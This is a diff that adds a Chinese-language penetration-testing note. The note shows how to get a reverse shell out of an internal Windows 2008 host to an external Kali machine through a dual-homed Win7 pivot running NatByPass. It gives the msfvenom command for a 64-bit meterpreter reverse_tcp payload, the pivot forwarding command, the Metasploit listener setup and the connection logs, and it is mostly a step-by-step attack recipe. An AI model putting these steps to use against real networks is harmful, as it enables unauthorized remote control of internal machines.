@@ -1,0 +1,74 @@
+NatByPass 实现 内网反弹shell 到外网 kali攻击机上:
+
+#测试环境，内网不能直接反弹shell到外网msf上，需要使用一个双网卡的跳板机 进行流量转发
+#192.168.1.1 外网网段
+#10.30.30.1  内网网段
+kali 外网攻击机器   192.168.1.15
+win7 跳板机 双网卡  192.168.1.48   10.30.30.133
+2008 内网目标机     10.30.30.131
+
+kali攻击机上生成反弹木马:
+#这里必须生成 64位  payload
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.30.30.133 lport=9999 
+-f exe > kali-msf2.exe
+#上传kali-msf2.exe 到 内网目标机
+
+win7 跳板机:
+start /b nb-windows-amd64.exe -tran 9999 192.168.1.15
+#2008内网目标机 反弹shell 内网win7:9999
+#win7:9999 将流量转发到 外网kali:7777
+
+2008 目标机:
+start /b kali-msf2.exe
+#win7 监听到2008的 流量表示成功
+# 2023/07/19 02:42:35.487040 [+] start connect host:[192.168.1.15:7777]
+2023/07/19 02:42:36.488442 [x] connect target address [192.168.1.15:7777] faild. retry in  5 seconds. 
+# 2023/07/19 02:42:36.488442 [←] close the connect at local:[10.30.30.133:9999] and remote:[10.30.30.131:49282]
+# 2023/07/19 02:42:36.488442 [√] accept a new client. remote address:[10.30.30.131:49283], local address:[10.30.30.133:9999]
+
+外网kali  msf监听7777端口:
+use exploit/multi/hander
+set payload windows/x64/meterpreter_reverse_tcp
+set lhost 192.168.1.15
+set lport 7777
+run
+#msf接收到反弹 meterpreter
+#win跳板流量
+# 2023/07/19 02:42:36.488442 [+] start connect host:[192.168.1.15:7777]
+2023/07/19 02:42:37.004243 [→] connect target address [192.168.1.15:7777] success.
+# 2023/07/19 02:42:37.004243 [+] start transmit. [192.168.1.48:49866],[192.168.1.15:7777] <-> [10.30.30.133:9999],[10.30.30.131:49283] 
+# 2023/07/19 03:17:47.021452 [√] accept a new client. remote address:[10.30.30.131:49286], local address:[10.30.30.133:9999]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
